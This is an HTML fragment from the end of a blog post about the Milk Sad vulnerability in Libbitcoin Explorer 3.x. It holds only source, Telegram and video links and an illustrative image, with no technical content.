<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/25MilkSadVulnerability" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://dzen.ru/video/watch/65478a2f6d9f3f7ec9641804" target="_blank" rel="noreferrer noopener">Video: https://dzen.ru/video/watch/65478a2f6d9f3f7ec9641804</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/milk-sad-vulnerability-in-libbitcoin-explorer" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/milk-sad-vulnerability-in-libbitcoin-explorer</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/046-1024x.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3852"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->


